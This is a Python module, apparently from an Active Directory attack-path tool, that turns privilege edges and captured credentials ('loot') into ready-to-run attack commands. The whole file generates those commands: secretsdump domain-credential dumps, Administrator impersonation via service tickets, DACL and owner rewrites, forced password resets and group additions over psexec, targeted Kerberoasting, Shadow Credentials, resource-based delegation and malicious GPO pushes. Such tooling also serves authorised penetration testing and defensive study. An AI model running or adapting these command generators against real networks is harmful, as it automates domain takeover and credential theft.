"""Command generation for exploitation paths."""

from __future__ import annotations

from dataclasses import dataclass

from engine.loot import LootManager


EDGE_TOOL_MAP: dict[str, str] = {
    "DCSync": "impacket-secretsdump",
    "GenericAll": "impacket-getST",
    "WriteDacl": "impacket-dacledit",
    "WriteOwner": "impacket-owneredit",
    "MemberOf": "powerview",
}


@dataclass
class NodeContext:
    """Minimal node context used for dynamic command formatting."""

    id: str
    name: str
    node_type: str
    spn: str = ""
    domain: str = ""


class CommandOracle:
    """Generate ready-to-run commands from edge context and available loot."""

    def __init__(self, loot_manager: LootManager) -> None:
        self.loot_manager = loot_manager

    def _infer_domain(self, source_node: NodeContext, target_node: NodeContext) -> str:
        for candidate in (source_node.domain, target_node.domain):
            if candidate:
                return candidate

        for candidate in (source_node.name, target_node.name):
            if "@" in candidate:
                return candidate.split("@", maxsplit=1)[1].upper()

        for candidate in (source_node.name, target_node.name):
            if "." in candidate:
                return ".".join(candidate.split(".")[1:]).upper()

        return "<DOMAIN>"

    def _infer_username(self, source_node: NodeContext) -> str:
        credential = self.loot_manager.get_credential(source_node.id) or self.loot_manager.get_credential(
            source_node.name,
        )
        if credential and credential.username:
            return credential.username

        if "@" in source_node.name:
            return source_node.name.split("@", maxsplit=1)[0]

        return source_node.name

    def _auth_flags(self, source_node: NodeContext) -> str:
        flags = self.loot_manager.build_auth_flags(source_node.id)
        if flags:
            return flags
        return self.loot_manager.build_auth_flags(source_node.name)

    def get_exploit_command(
        self,
        edge_type: str,
        source_node: dict[str, str],
        target_node: dict[str, str],
    ) -> str:
        """Return a command template populated with loot and node metadata."""
        source = NodeContext(
            id=str(source_node.get("id", "")),
            name=str(source_node.get("name", "SOURCE_USER")),
            node_type=str(source_node.get("type", "entity")),
            spn=str(source_node.get("spn", "")),
            domain=str(source_node.get("domain", "")),
        )
        target = NodeContext(
            id=str(target_node.get("id", "")),
            name=str(target_node.get("name", "TARGET")),
            node_type=str(target_node.get("type", "entity")),
            spn=str(target_node.get("spn", "")),
            domain=str(target_node.get("domain", "")),
        )

        domain = self._infer_domain(source, target)
        username = self._infer_username(source)
        auth_flags = self._auth_flags(source)
        auth_part = f" {auth_flags}" if auth_flags else ""

        normalized_edge = edge_type or "Unknown"

        if normalized_edge == "DCSync":
            target_dc = target.name or "<DC_HOST>"
            return (
                f"impacket-secretsdump{auth_part} {domain}/{username}@{target_dc} "
                "-just-dc"
            )

        if normalized_edge == "GenericAll" and target.node_type == "computer":
            target_spn = target.spn or f"HOST/{target.name}"
            target_host = target.name or "<TARGET_COMPUTER>"
            return (
                f"# Step 1: Get service ticket (requires GenericAll on computer) \n"
                f"impacket-getST{auth_part} -spn {target_spn} {domain}/{username} "
                f"-impersonate Administrator\n"
                f"# Step 2: Use ticket for lateral movement (set KRB5CCNAME first)"
            )

        if normalized_edge == "WriteDacl":
            target_object = target.name or target.id or "<TARGET_OBJECT>"
            return (
                f"impacket-dacledit{auth_part} -action write -rights FullControl "
                f"-target '{target_object}' {domain}/{username}"
            )

        if normalized_edge == "WriteOwner":
            target_object = target.name or target.id or "<TARGET_OBJECT>"
            return (
                f"impacket-owneredit{auth_part} -action write -target '{target_object}' "
                f"{domain}/{username}"
            )

        if normalized_edge == "MemberOf":
            target_group = target.name or "<TARGET_GROUP>"
            return (
                f"powershell -c \"Get-DomainGroupMember -Identity '{target_group}'\""
            )

        # ForcePasswordChange / CanForceChangePassword
        if normalized_edge in ("ForcePasswordChange", "CanForceChangePassword"):
            target_user = target.name or "<TARGET_USER>"
            # Extract username if it contains domain prefix
            if "\\" in target_user:
                target_user = target_user.split("\\", maxsplit=1)[1]
            elif "@" in target_user:
                target_user = target_user.split("@", maxsplit=1)[0]
            
            new_password = "<NEW_PASSWORD>"
            target_host = "<TARGET_HOST>"
            return (
                f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
                f"'net user {target_user} {new_password}'"
            )

        # CanAddMember / AddMember
        if normalized_edge in ("CanAddMember", "AddMember"):
            target_group = target.name or "<TARGET_GROUP>"
            if "\\" in target_group:
                target_group = target_group.split("\\", maxsplit=1)[1]
            elif "@" in target_group:
                target_group = target_group.split("@", maxsplit=1)[0]
            
            member_to_add = "<MEMBER_TO_ADD>"
            target_host = "<TARGET_DOMAIN_CONTROLLER>"
            return (
                f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
                f"'net group \"{target_group}\" {member_to_add} /add /domain'"
            )

        # AllExtendedRights
        if normalized_edge == "AllExtendedRights":
            if target.node_type == "user":
                # AllExtendedRights on user = reset password via net user
                target_user = target.name or "<TARGET_USER>"
                if "\\" in target_user:
                    target_user = target_user.split("\\", maxsplit=1)[1]
                elif "@" in target_user:
                    target_user = target_user.split("@", maxsplit=1)[0]
                
                new_password = "<NEW_PASSWORD>"
                target_host = "<TARGET_HOST>"
                return (
                    f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
                    f"'net user {target_user} {new_password}'"
                )
            else:
                # AllExtendedRights on group/computer = full DACL control
                target_object = target.name or target.id or "<TARGET_OBJECT>"
                return (
                    f"impacket-dacledit{auth_part} -action write -rights AllExtendedRights "
                    f"-principal '{username}' -target '{target_object}' {domain}/{username}"
                )

        # GenericWrite / CanGenericWrite
        if normalized_edge in ("GenericWrite", "CanGenericWrite"):
            target_object = target.name or target.id or "<TARGET_OBJECT>"
            target_name_l = target_object.casefold()

            if target.node_type == "user":
                return (
                    f"# GenericWrite on USER: common abuses\n"
                    f"# 1) Targeted Kerberoast by writing SPN\n"
                    f"bloodyAD --host <DC_IP> -d {domain} -u {username}{auth_part} "
                    f"set object '{target_object}' servicePrincipalName -v 'HTTP/{target_object}'\n"
                    f"impacket-GetUserSPNs -dc-ip <DC_IP> -request {domain}/{username}{auth_part}\n"
                    f"# 2) Shadow Credentials (msDS-KeyCredentialLink)\n"
                    f"pywhisker -d {domain} -u {username}{auth_part} "
                    f"--target '{target_object}' --action add"
                )

            if target.node_type == "group":
                return (
                    f"# GenericWrite on GROUP: add controlled principal to group\n"
                    f"net rpc group addmem '{target_object}' '<CONTROLLED_USER>' "
                    f"-U '{domain}/{username}%<PASSWORD_OR_HASH>' -S <DC_HOST>\n"
                    f"# or\n"
                    f"bloodyAD --host <DC_IP> -d {domain} -u {username}{auth_part} "
                    f"add groupMember '{target_object}' '<CONTROLLED_USER>'"
                )

            if target.node_type == "computer":
                return (
                    f"# GenericWrite on COMPUTER: common abuses\n"
                    f"# 1) Shadow Credentials via msDS-KeyCredentialLink\n"
                    f"pywhisker -d {domain} -u {username}{auth_part} "
                    f"--target '{target_object}' --action add\n"
                    f"# 2) RBCD path (set msDS-AllowedToActOnBehalfOfOtherIdentity)\n"
                    f"impacket-rbcd{auth_part} -dc-ip <DC_IP> -action write "
                    f"-delegate-from '<CONTROLLED_COMPUTER>$' -delegate-to '{target_object}' "
                    f"{domain}/{username}"
                )

            # Heuristic handling for object classes we do not explicitly model yet.
            if "cn=" in target_name_l and "policies" in target_name_l:
                return (
                    f"# GenericWrite on GPO: push malicious policy\n"
                    f"pygpoabuse -d {domain} -u {username}{auth_part} --gpo-id '<GPO_GUID>' "
                    f"--command '<PAYLOAD_COMMAND>'\n"
                    f"# Also consider SharpGPOAbuse on Windows"
                )

            if target_name_l.startswith("ou="):
                return (
                    f"# GenericWrite on OU: abuse gPLink to apply attacker-controlled GPO\n"
                    f"# Follow WriteGPLink abuse flow against this OU\n"
                    f"# Target OU: {target_object}"
                )

            if target.node_type == "domain" or target_name_l.startswith("dc="):
                return (
                    f"# GenericWrite on DOMAIN: abuse gPLink at domain root\n"
                    f"# Follow WriteGPLink abuse flow to impact many principals\n"
                    f"# Target domain object: {target_object}"
                )

            return (
                f"# GenericWrite on {target.node_type or 'object'}: writeable attributes depend on object class\n"
                f"# Target: {target_object}\n"
                f"# Enumerate writeable attrs and pick abuse path (SPN, msDS-KeyCredentialLink, group membership, gPLink, ADCS attrs)"
            )

        # Owns
        if normalized_edge == "Owns":
            target_object = target.name or target.id or "<TARGET_OBJECT>"
            return (
                f"impacket-owneredit{auth_part} -action write -target '{target_object}' "
                f"{domain}/{username}\n"
                f"# Owner has full control; consider next steps like DACL modification or password reset"
            )

        tool = EDGE_TOOL_MAP.get(normalized_edge, "manual")
        return (
            f"# Edge type '{normalized_edge}' requires manual enumeration or custom approach\n"
            f"# Source: {source.name} ({source.node_type}) -> Target: {target.name} ({target.node_type})\n"
            f"# Suggested tool to investigate: {tool}\n"
            f"# Try using impacket-psexec, impacket-wmiexec, or impacket-smbexec for execution"
        )

    def get_kerberoast_command(self, target_node: dict[str, str]) -> str:
        """Return an impacket-GetUserSPNs command for a kerberoastable target node."""
        target = NodeContext(
            id=str(target_node.get("id", "")),
            name=str(target_node.get("name", "TARGET_USER")),
            node_type=str(target_node.get("type", "user")),
            spn=str(target_node.get("spn", "")),
            domain=str(target_node.get("domain", "")),
        )
        domain = self._infer_domain(target, target)

        # Use any available credential from loot as the attacker context.
        attacker_user = "<attacker_user>"
        auth_part = ""
        all_creds = self.loot_manager.all_credentials()
        if all_creds:
            first_cred = all_creds[0]
            attacker_principal = first_cred.get("principal", "")
            flags = self.loot_manager.build_auth_flags(attacker_principal)
            if flags:
                auth_part = f" {flags}"
                raw_user = (
                    first_cred.get("username", "")
                    or attacker_principal.split("\\")[-1]
                )
                attacker_user = raw_user or attacker_user

        target_sam = target.name.split("@")[0] if "@" in target.name else target.name
        return (
            f"impacket-GetUserSPNs{auth_part} {domain}/{attacker_user} "
            f"-request-user {target_sam} -outputfile kerberoast.hashes"
        )
